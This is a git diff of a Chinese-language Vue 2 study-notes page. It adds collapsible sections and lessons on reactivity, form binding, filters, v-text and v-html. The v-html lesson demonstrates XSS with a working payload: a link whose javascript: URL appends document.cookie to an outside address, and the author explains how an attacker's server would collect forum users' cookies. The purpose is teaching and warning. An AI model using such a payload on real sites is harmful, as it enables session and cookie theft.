@@ -14,22 +14,20 @@
       margin: 0px;
       background-color: whitesmoke;
     }
-
     #frame {
       width: 1350px;
       margin: auto;
       padding: 0px 10px;
       border-style: none solid none solid;
       border-width: 1px;
-      font-size: 130%;
+      font-size: 123%;
     }
-
     #h1{
       /* position: -webkit-sticky; */
-      /* position: sticky; */
-      position: relative;
+      position: sticky;
+      /* position: relative; */
       top: 0;
-      padding: 24.12px 0px 0px 0px;
+      padding: 2rem 0px 0px 0px;
       /* margin-bottom: 24px; */
       background-color: whitesmoke;
       height: 50px;
@@ -37,12 +35,10 @@
       display: flex;
       align-items: center;
     }
-
     #h1>h1{
       background-color: whitesmoke;
       margin: 0px;
     }
-
     #zoom {
       /* position: absolute; */
       /* top: 19px; */
@@ -54,40 +50,61 @@
       transition: width 1s;
       font-size: 12px;
     }
-
     /* 使zoom无加减器（微调控件） */
     input::-webkit-outer-spin-button,
     input::-webkit-inner-spin-button {
       -webkit-appearance: none;
     }
-
     /* 好像没用，忘记为啥写这个了 */
     /* input[type="number"] {
       -moz-appearance: textfield;
       -webkit-appearance: textfield;
       appearance: textfield;
     } */
-
     #zoom:focus {
       width: 280px;
     }
-
+    #yjzk{
+      background-color: #e7e7e7;
+      border: none;
+      color: black;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 0px 0px 3px 3rem;
+    }
     a {
       color: brown;
     }
-
     .code_1{
       font-size: 150%;
       color: white;
+      display: none;
       background-color: rgb(49, 63, 65);
       word-wrap: break-word;
       white-space: pre-wrap;
     }
-
     #jsst{
       color: red;
     }
-
+    .down{
+      font-size: 1.5rem;
+      margin-left: 1rem;
+      font-weight: bold;
+      user-select:none;
+      -moz-user-select: none;
+      -o-user-select:none;
+      -khtml-user-select:none;
+      -webkit-user-select:none;
+      -ms-user-select:none;
+    }
+    #tips1{
+      font-size: 1rem;
+      margin-left: 1rem;
+    }
   </style>
 </head>
 
@@ -96,6 +113,7 @@
     <div id="h1">
       <h1>Vue 笔记</h1>
       <input type="number" max="200" min="75" id="zoom" placeholder="输入数字可以控制文字大小 , 自带 % 哦 , 默认200%" onchange="trigger(this.value)">
+      <button id="yjzk" onclick="sqzk(this)">一键展开所有下拉栏↓</button>
     </div>
     <p>如果我哪里疏忽大意，抑或是你有更好建议，可以联系QQ:1204184336，邮箱:1204184336@qq.com</p>
     <a href="https://www.bilibili.com/video/BV1Zy4y1K7SH?spm_id_from=333.999.0.0">尚硅谷Vue2.0+Vue3.0全套教程</a>
@@ -113,8 +131,8 @@
 
     <hr>
     <!-- 1 11/18 -->
-    <h2>第一个Vue实例 - Vue模板语法:{{}} -插值语法</h2>
-    <pre class="code_1">  
+    <h2>第一个Vue实例 - Vue模板语法:{{}} -插值语法 <span class="down" onclick="clickondown(this)">\/<span id="tips1">←这是下拉栏</span></span></h2>
+    <pre class="code_1"><button class="copy">复制</button>
     &lt;!DOCTYPE html&gt;
     &lt;html lang="zh"&gt;
 
@@ -154,7 +172,7 @@
     
     <hr>
     <!-- 2 11/18 -->
-    <h2>Vue模板语法:v-bind -指令语法</h2>
+    <h2>Vue模板语法:v-bind -指令语法 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -201,7 +219,7 @@
 
     <hr>
     <!-- 3 11/19 -->
-    <h2>Vue模板语法:v-model -指令语法</h2>
+    <h2>Vue模板语法:v-model -指令语法 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -240,7 +258,7 @@
 
     <hr>
     <!-- 4 11/19 -->
-    <h2>el和data的两种写法</h2>
+    <h2>el和data的两种写法 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -282,7 +300,7 @@
 
     <hr>
     <!-- 5 11/19 -->
-    <h2>数据代理</h2>
+    <h2>数据代理 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -326,7 +344,7 @@
 
     <hr>
     <!-- 6 11/19 -->
-    <h2>Vue中的数据代理</h2>
+    <h2>Vue中的数据代理 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -372,7 +390,7 @@
 
     <hr>
     <!-- 7 11/19 -->
-    <h2>Vue模板语法:v-on -指令语法 事件处理</h2>
+    <h2>Vue模板语法:v-on -指令语法 事件处理 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -415,7 +433,7 @@
 
     <hr>
     <!-- 8 11/22 -->
-    <h2>Vueの事件修饰符</h2>
+    <h2>Vueの事件修饰符 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -520,7 +538,7 @@
 
     <hr>
     <!-- 9 11/22 -->
-    <h2>Vue的按键修饰符</h2>
+    <h2>Vue的按键修饰符 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -598,7 +616,7 @@
 
     <hr>
     <!-- 10 12/29 -->
-    <h2>computed(计算属性)</h2>
+    <h2>computed(计算属性) <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -704,7 +722,7 @@
 
     <hr>
     <!-- 11 12/29 -->
-    <h2>监视属性</h2>
+    <h2>监视属性 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -781,7 +799,7 @@
 
     <hr>
     <!-- 12 12/30 -->
-    <h2>样式绑定</h2>
+    <h2>样式绑定 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -844,7 +862,7 @@
 
     <hr>
     <!-- 13 12/30 -->
-    <h2>条件渲染 v-if</h2>
+    <h2>条件渲染 v-if <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -918,7 +936,7 @@
     
     <hr>
     <!-- 14 12/30 -->
-    <h2>列表渲染 v-for</h2>
+    <h2>列表渲染 v-for <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -1012,7 +1030,7 @@
     
     <hr>
     <!-- 15 12/31 -->
-    <h2>列表过滤</h2>
+    <h2>列表过滤 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -1103,7 +1121,7 @@
     
     <hr>
     <!-- 16 12/31 -->
-    <h2>列表排序</h2>
+    <h2>列表排序 <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
       &lt;!DOCTYPE html&gt;
       &lt;html lang="zh"&gt;
@@ -1198,192 +1216,617 @@
     <p>无总结</p>
     
     <hr>
-    <!-- 17 12/31 -->
-    <h2></h2>
+    <!-- 17 1/5 -->
+    <h2>Vue更新时的一个问题 <span class="down" onclick="clickondown(this)">\/</span></h2>
+    <pre class="code_1">
+      &lt;!DOCTYPE html&gt;
+      &lt;html lang="zh"&gt;
+        &lt;head&gt;
+          &lt;meta charset="UTF-8"&gt;
+          &lt;title&gt;没错，我就是标题&lt;/title&gt;
+          &lt;style&gt;
+            div{
+              width: 651px;
+              height: 510px;
+              margin: 0px auto;
+            }
+            .root{
+              background-color: rgb(160, 160, 160);
+            }
+            .root1{
+              border: 5px solid aqua;
+            }
+            h3{
+              text-align: center;
+            }
+            h1{
+              font-size: 30px;
+              text-align: center;
+            }
+          &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+          &lt;div id="root" class="root root1"&gt;
+            &lt;h3&gt;打开Vue开发者工具，然后点击下面的按钮，查询张三信息是否改变&lt;/h3&gt;
+            &lt;button @click="update"&gt;点击改变张三的个人信息&lt;/button&gt;
+            &lt;ul&gt;
+              &lt;li v-for="(p,index) in perspns" :key="p.id"&gt;
+                {{p.name}} ---- {{p.age}} ---- {{p.sex}} ---- {{p.gender}} ---- {{p.hobby}}
+              &lt;/li&gt;
+            &lt;/ul&gt;
+            &lt;h3 style="display: none;"&gt;看不见看不见&lt;/h3&gt;
+            &lt;button style="display: none;" @click="add" &gt;点击我再看看&lt;/button&gt;
+            &lt;h3 style="display: none;"&gt;看不见看不见&lt;/h3&gt;
+          &lt;/div&gt;
+      
+          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
+          &lt;script&gt;
+            const vm = new Vue({
+              el: '#root',
+              data: {
+                perspns:[
+                  {id:4,name:'张三',age:'31',sex:"male",gender:'man'},
+                  {id:3,name:'张四',age:'14',sex:"male",gender:'man'},
+                  {id:2,name:'张五',age:'15',sex:"male",gender:'man'},
+                  {id:1,name:'张六',age:'61',sex:"male",gender:'man'},
+                ],
+              },
+              methods:{
+                update(){
+                  document.getElementById('root').childNodes[6].innerHTML =
+                  '你应该在Console里面发现了我打印的perspns[0]，但是为什么Vue模板没有更新呢？\
+                  在控制台获取vm对象里面的perspns你就会发现，虽然data和_data里面张三所在的对象\
+                  确实已经被替换为一个全新的对象，但是这也导致了原本Vue对这个对象所做的数据代理\
+                  和数据劫持也全部被替换,没有了数据代理，Vue就监测不到数据的变动，自然不会更新模板';
+                  document.getElementById('root').childNodes[6].style.display = 'block';
+                  document.getElementById('root').childNodes[8].style.display = 'block';
+      
+                  console.log(this.perspns[0]);
+                  this.perspns[0] = {id:4,name:'法外三',age:'23',sex:"male",gender:'man'},  
+                  console.log(this.perspns[0]);
+                },
+                add(){
+                  //给对象添加
+                  Vue.set(this.perspns[2],'hobby','tea');//是同一个api，只是不同写法
+                  this.$set(this.perspns[3],'hobby','tea');//是同一个api，只是不同写法
+      
+                  //给数组添加
+                  //Vue.set
+                  Vue.set(this.perspns,'4',{id:5,name:'张七',age:'71',sex:'male',gender:'man'});
+                  //Vue包装过的push
+                  this.perspns.push({id:6,name:'张八',age:'81',sex:'male',gender:'man'});
+      
+                  document.getElementById('root').childNodes[10].style.display = 'block';
+                  document.getElementById('root').childNodes[10].innerHTML =
+                  '你会发现我新增了张七、张八，给张五，张六增添了hobby: tea,\
+                  并且张三改的名也正确的显示了,\
+                  仔细看源码你会发现我之前的修改按钮使用的是操控dom的方式来给页面增添新东西\
+                  因为这样才不会使Vue更新模板，导致张三改名成功，\
+                  而"点击我再看看"这个按钮用的是Vue.set,这就是张三改名成功的原因所在，\
+                  因为Vue.set会让Vue重新对比解析data的内容，导致你的修改被发现了，\
+                  但是也只是仅仅被发现而已，Vue不会在对他做数据代理和数据劫持，\
+                  你之前的修改并没有成功"转正",Vue只是重新对比解析data的内容\
+                  所以张三就改名成功了，当然，能让Vue重新解析模板的方法不止这一个，你都可以尝试尝试\
+                  但是，Vue.set也不是万能的，他不能给vm实例和data这个根数据对象添加新东西，所以要绕开\
+                  这两个元素，选择data内的对象或数组为模板的内容\
+                  想要增加响应式的内容，还是需要Vue.set和Vue包装过的七个数组方法。';
+                }
+              },
+              computed:{
+      
+              },
+              watch:{
+      
+              }
+            })
+          &lt;/script&gt;
+        &lt;/body&gt;
+      &lt;/html&gt;
+    </pre>
+    <pre style="font-size: 20px;">
+      vue监视数据的原理:
+        1. vue会监视data中所有层次的数据。
+
+        2．如何监测对象中的数据?
+          通过setter实现监视，且要在new Vue时就传入要监测的数据。
+            (1).对象中后追加的属性,Vue默认不做响应式处理
+            (2).如需给后添加的属性做响应式,请使用如下API:
+              Vue.set(target,propertyName/index.value）或
+              vm.$set(target.propertyName/index,value)
+
+        3．如何监测数组中的数据?
+          通过包裹数组更新元素的方法实现,本质就是做了两件事:
+            (1).调用原生对应的方法对数组进行更新。
+            (2).重新解析模板,进而更新页面。
+
+        4.在Vue修改数组中的某个元素一定要用如下方法:
+          1.使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
+          2.vue.set()或vm.$set()
+
+        特别注意:Vue.set()和 vm.$set(）不能给vm 或 vm的根数据对象添加属性!!
+    </pre>
+    
+    <hr>
+    <!-- 18 1/5 -->
+    <h2>v-model的修饰符和表单收集数据 <span class="down" onclick="clickondown(this)">\/</span></h2>
+    <pre class="code_1">
+      &lt;!DOCTYPE html&gt;
+      &lt;html lang="zh"&gt;
+        &lt;head&gt;
+          &lt;meta charset="UTF-8"&gt;
+          &lt;title&gt;没错，我就是标题&lt;/title&gt;
+          &lt;style&gt;
+            div{
+              width: 950px;
+              height: 900px;
+              margin: 0px auto;
+              background-color: azure;
+            }
+          &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+          &lt;div id="root"&gt;
+            &lt;form @submit.prevent="rua"&gt;
+              &lt;label for="Identification"&gt;账号:&lt;/label&gt;
+              &lt;input type="text" id="Identification" v-model.trim="Identification" autocomplete="off"&gt;&lt;br&gt;&lt;br&gt;
+              &lt;label for="Password"&gt;密码:&lt;/label&gt;
+              &lt;input type="password" id="Password" v-model="Password"&gt;&lt;br&gt;&lt;br&gt;
+              &lt;label for="Number"&gt;年龄:&lt;/label&gt;
+              &lt;input type="number" id="Number" v-model.number="Number"&gt;&lt;br&gt;&lt;br&gt;
+              性别:
+              男&lt;input type="radio" name="sex" v-model="sex" value="m"&gt;
+              女&lt;input type="radio" name="sex" v-model="sex" value="w"&gt;&lt;br&gt;&lt;br&gt;
+              爱好:
+              吃&lt;input type="checkbox" v-model="hobby" value="c"&gt;
+              喝&lt;input type="checkbox" v-model="hobby" value="h"&gt;
+              睡&lt;input type="checkbox" v-model="hobby" value="s"&gt;&lt;br&gt;&lt;br&gt;
+              所属校区:
+              &lt;select v-model="city"&gt;
+                &lt;option value="请选择"&gt;请选择&lt;/option&gt;
+                &lt;option value="a"&gt;a&lt;/option&gt;
+                &lt;option value="b"&gt;b&lt;/option&gt;
+                &lt;option value="c"&gt;c&lt;/option&gt;
+                &lt;option value="d"&gt;d&lt;/option&gt;
+                &lt;option value="e"&gt;e&lt;/option&gt;
+                &lt;option value="f"&gt;f&lt;/option&gt;
+              &lt;/select&gt;&lt;br&gt;&lt;br&gt;
+              其他信息:
+              &lt;textarea name="" id="" cols="30" rows="10" v-model.lazy="other"&gt;&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;
+              &lt;input type="checkbox" v-model="agree"&gt;阅读并接受&lt;a href="./index.html"&gt;《用户协议》&lt;/a&gt;&lt;br&gt;&lt;br&gt;
+              &lt;button&gt;提交&lt;/button&gt;
+            &lt;/form&gt;
+          &lt;/div&gt;
+      
+          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
+          &lt;script&gt;
+            const vm = new Vue({
+              el: '#root',
+              data: {
+                Identification:'',
+                Password:'',
+                Number:'',
+                sex:'m',
+                hobby:[],
+                city:"请选择",
+                other:'',
+                agree:'',
+              },
+              methods:{
+                rua(){
+                  console.log(this.Identification);
+                  console.log(this.Password);
+                  console.log(this.Number);
+                  console.log(this.sex);
+                  console.log(this.hobby);
+                  console.log(this.city);
+                  console.log(this.other);
+                  console.log(this.agree);
+                }
+              },
+              computed:{
+      
+              },
+              watch:{
+      
+              }
+            })
+          &lt;/script&gt;
+        &lt;/body&gt;
+      &lt;/html&gt;
+    </pre>
+    <p>无总结</p>
+    
+    <hr>
+    <!-- 18 1/8 -->
+    <h2>过滤器 <span class="down" onclick="clickondown(this)">\/</span></h2>
+    <pre class="code_1">
+      &lt;!DOCTYPE html&gt;
+      &lt;html lang="zh"&gt;
+        &lt;head&gt;
+          &lt;meta charset="UTF-8"&gt;
+          &lt;title&gt;没错，我就是标题&lt;/title&gt;
+          &lt;style&gt;
+            div{
+              width: 950px;
+              margin: 0px auto;
+              background-color: rgb(154, 241, 151);
+              font-size: 20px;
+            }
+            p{
+              margin: 18px 0px;
+            }
+          &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+          &lt;div id="root"&gt;
+            &lt;p&gt;总毫秒数（但是以0代替毫秒具体值） —————— {{ time1 }}&lt;/p&gt;
+            &lt;p&gt;总毫秒数 —————— {{ time2 }}&lt;/p&gt;
+            &lt;p&gt;总毫秒数 —————— {{ time3 }}&lt;/p&gt;
+            &lt;p&gt;年 —————— {{ time4 }}&lt;/p&gt;
+            &lt;p&gt;月 —————— {{ time5 }}&lt;/p&gt;
+            &lt;p&gt;日 —————— {{ time6 }}&lt;/p&gt;
+            &lt;p&gt;星期几(0是日) —————— {{ time7 }}&lt;/p&gt;
+            &lt;p&gt;时 —————— {{ time9 }}&lt;/p&gt;
+            &lt;p&gt;分 —————— {{ time10 }}&lt;/p&gt;
+            &lt;p&gt;秒 —————— {{ time11 }}&lt;/p&gt;
+            &lt;p&gt;毫秒 —————— {{ time12 }}&lt;/p&gt;
+            &lt;p&gt;xxxx/xx/xx —————— {{ time13 }}&lt;/p&gt;
+            &lt;p&gt;x午xx:xx:xx —————— {{ time14 }}&lt;/p&gt;
+            &lt;p&gt;xxxx/xx/xx x午xx:xx:xx —————— {{ time15 }}&lt;/p&gt;&lt;br&gt;
+            &lt;p&gt;Vue的计算属性实现时间&lt;/p&gt;
+            &lt;p&gt;{{ computedtime }}&lt;/p&gt;
+            &lt;p&gt;Vue的methods实现时间&lt;/p&gt;
+            &lt;p&gt;{{ methodstime() }}&lt;/p&gt;
+            &lt;p&gt;Vue的过滤器实现时间&lt;/p&gt;
+            &lt;p&gt;{{ time2 | zdymc }}&lt;/p&gt;
+            &lt;p&gt;es6形参默认值&lt;/p&gt;
+            &lt;p&gt;{{ time2 | zdymc('如果有传参，那就使用传参，如果没有传参，就使用默认值') }}&lt;/p&gt;
+            &lt;p&gt;Vue的过滤器还可以连写&lt;/p&gt;
+            &lt;p&gt;{{ time2 | zdymc | zdymc2 }}&lt;/p&gt;
+            &lt;p&gt;Vue的全局过滤器&lt;/p&gt;
+            &lt;p&gt;{{ time2 | 这里是自定义名称 }}&lt;/p&gt;
+          &lt;/div&gt;
+      
+          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
+          &lt;script&gt;
+            Vue.filter('这里是自定义名称',function(value,wyz='我就是全局过滤器，全局语句必须写在第一个new Vue的前面'){
+              return `${wyz}。过滤器除了可以用在插值语法中，还能用在v-bind中，再其他好像就不行了`
+            })
+      
+            const vm = new Vue({
+              el: '#root',
+              data: {
+                Day:['星期日','星期一','星期二','星期三','星期四','星期五','星期六'],
+                time1:Date.parse(new Date()),
+                time2:(new Date()).valueOf(),
+                time3:new Date().getTime(),
+                time4:new Date().getFullYear(),
+                time5:new Date().getMonth()+1,
+                time6:new Date().getDate(),
+                time7:new Date().getDay(),
+                time9:new Date().getHours(),
+                time10:new Date().getMinutes(),
+                time11:new Date().getSeconds(),
+                time12:new Date().getMilliseconds()  ,
+                time13:new Date().toLocaleDateString(),
+                time14:new Date().toLocaleTimeString(),
+                time15:new Date().toLocaleString(),
+              },
+              methods:{
+                methodstime(){
+                  return `${new Date().getFullYear()}年${new Date().getMonth()+1}月${new Date().getDate()}日`
+                }
+              },
+              computed:{
+                computedtime(){
+                  return `${new Date().getFullYear()}年${new Date().getMonth()+1}月${new Date().getDate()}日`
+                }
+              },
+              watch:{
+      
+              },
+              filters:{ //这里的过滤器是局部过滤器，在以后的组件中，组件与组件之间的作用域是不同的，全局过滤器在上面
+                zdymc(value,xxx='我就是默认值'){  // zdymc = 自定义名称， 由zdymc:function(){}简写
+                //zdymc可以接受两个参数，value接收的必定是 | 前的那个参数（time2）
+                //xxx为zdymc()内的参数，也就是es6的形参默认值, return将会覆盖整个插值语法块
+                  return `${xxx}  ${new Date().getFullYear()}年${new Date().getMonth()+1}月${new Date().getDate()}日`
+                },
+                zdymc2(value,xxx='连写很好理解，就是将上一个过滤器的return再次塞进一个过滤器当中'){
+                  return `${xxx}  ${value.slice(8,13)}`
+                }
+              },
+            })
+          &lt;/script&gt;
+        &lt;/body&gt;
+      &lt;/html&gt;
+    </pre>
+    <p>无总结</p>
+    
+    <hr>
+    <!-- 18 1/8 -->
+    <h2>v-text <span class="down" onclick="clickondown(this)">\/</span></h2>
+    <pre class="code_1">
+      &lt;!DOCTYPE html&gt;
+      &lt;html lang="zh"&gt;
+        &lt;head&gt;
+          &lt;meta charset="UTF-8"&gt;
+          &lt;title&gt;没错，我就是标题&lt;/title&gt;
+          &lt;style&gt;
+            div{
+              width: 950px;
+              margin: 0px auto;
+              background-color: rgb(154, 241, 151);
+              font-size: 20px;
+            }
+          &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+          &lt;div id="root"&gt;
+            &lt;div&gt;你好，{{ name }}&lt;/div&gt;
+            &lt;div v-text='name'&gt;我写不写都一样，反正你看不到&lt;/div&gt;
+            &lt;!-- v-text会替代整个标签的内容 --&gt;
+          &lt;/div&gt;
+      
+          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
+          &lt;script&gt;
+      
+            const vm = new Vue({
+              el: '#root',
+              data: {
+                name:'wyz',
+              },
+              methods:{
+              },
+              computed:{
+              },
+              watch:{
+              },
+              filters:{ 
+              },
+            })
+          &lt;/script&gt;
+        &lt;/body&gt;
+      &lt;/html&gt;
+    </pre>
+    <p>无总结</p>
+    
+    <hr>
+    <!-- 18 1/10 -->
+    <h2>v-html <span class="down" onclick="clickondown(this)">\/</span></h2>
+    <pre class="code_1">
+      &lt;!DOCTYPE html&gt;
+      &lt;html lang="zh"&gt;
+        &lt;head&gt;
+          &lt;meta charset="UTF-8"&gt;
+          &lt;title&gt;没错，我就是标题&lt;/title&gt;
+          &lt;style&gt;
+            div{
+              width: 1050px;
+              margin: 0px auto;
+              background-color: rgb(154, 241, 151);
+              font-size: 20px;
+            }
+          &lt;/style&gt;
+        &lt;/head&gt;
+        &lt;body&gt;
+          &lt;div id="root"&gt;
+            &lt;div&gt;你好，{{ name }}&lt;/div&gt;
+            &lt;div v-html='name2'&gt;我写不写都一样，反正你看不到&lt;/div&gt;
+            &lt;!-- 跟v-text相比，v-html会解析标签，并且也会替代整个标签的内容 --&gt;
+            &lt;p&gt;跟v-text相比，v-html会解析标签，并且也会替代整个标签的内容&lt;/p&gt;
+            &lt;p&gt;注意！任何动态渲染任何html是很危险的，这可能会导致xss攻击&lt;/p&gt;
+            &lt;h1&gt;xss攻击，安全隐患！&lt;/h1&gt;
+            &lt;p&gt;为了演示，假装，我这个页面是有登录系统的(去application=&gt;cookies里双击随便写点东西)&lt;/p&gt;
+            &lt;button @click="add" style="width: 310px; height: 50px; font-size: 31px;"&gt;按我添加cookie信息&lt;/button&gt;
+            &lt;p&gt;可以看到，假cookie已经被添加进网页了&lt;/p&gt;
+            &lt;p&gt;
+              注意观看，cookie里有一项参数叫HttpOnly，如果cookie的这一项打钩了，客户端脚本将无法访问cookie，
+              cookie就不会被document.cookie取到值（一般来说，后台都会对重要参数的HttpOnly打上√），
+              很显然，我们没打，因此你可以通过下面这个按钮获取到我们这个页面的cookie
+            &lt;/p&gt;
+            &lt;button @click="add2" style="width: 510px; height: 50px; font-size: 31px;"&gt;获取当前页面的cookie信息&lt;/button&gt;
+            &lt;p&gt;现在你应该在console里看到了之前我们添加的假cookie&lt;/p&gt;
+            &lt;p&gt;到目前为止，你是不是觉得，诶，这不都是本地做到的吗，咋攻击别人啊，看看下面，你就知道了&lt;/p&gt;
+            &lt;p&gt;假如下面这个是个留言板，他没有做任何过滤&lt;/p&gt;
+            &lt;p&gt;
+              你往里面扔了这么一句话，&lt;br&gt;
+              &lt;a href=javascript:location.href="https://www.baidu.com?"+document.cookie&gt;澳门赌场，一夜暴富&lt;/a&gt;
+            &lt;/p&gt;
+            &lt;p&gt;点击提交&lt;/p&gt;
+            &lt;form @submit.prevent="rua"&gt;
+              &lt;textarea cols="70" rows="3" style="font-size: 21px;" v-model.lazy="other"&gt;&lt;/textarea&gt;
+              &lt;button&gt;提交&lt;/button&gt;
+            &lt;/form&gt;
+            &lt;p&gt;
+              先看我这句话再点链接&lt;span id="a"&gt;&lt;/span&gt;，点击链接后注意看浏览器地址栏里的网址，你会发现在网址的末端，
+              你的cookie已经被传走了，假如你在某个论坛发布了这一句话，把这句话里的百度网址换成你
+              自己的服务器，那点击链接的人所在论坛的cookie不就全部传到了你自己的服务器，
+              是不是就造成了大量的cookie泄露，虽然重要cookie都会有HttpOnly，虽然留言板一般都会有
+              过滤，但是攻击手段也不仅仅于此，望重视。
+            &lt;/p&gt;
+          &lt;/div&gt;
+      
+          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
+          &lt;script&gt;
+      
+            const vm = new Vue({
+              el: '#root',
+              data: {
+                name:'wyz',
+                name2:'&lt;h3&gt;wyz&lt;/h3&gt;',
+                other:'&lt;a href=javascript:location.href="https://www.baidu.com?"+document.cookie&gt;澳门赌场，一夜暴富&lt;/a&gt;',
+              },
+              methods:{
+                add(){
+                  document.cookie = '假装是cookie=abaaba;';
+                },
+                add2(){
+                  console.log(document.cookie);
+                },
+                rua(){
+                  document.getElementById('a').innerHTML = this.other;
+                }
+              },
+              computed:{
+              },
+              watch:{
+              },
+              filters:{ 
+              },
+            })
+          &lt;/script&gt;
+        &lt;/body&gt;
+      &lt;/html&gt;
+    </pre>
+    <p>无总结</p>
+    
+    <hr>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
     <p>无总结</p>
     
     <hr>
-    <!-- 18 12/31 -->
-    <h2></h2>
+    <!-- 18 1/8 -->
+    <h2> <span class="down" onclick="clickondown(this)">\/</span></h2>
     <pre class="code_1">
 
     </pre>
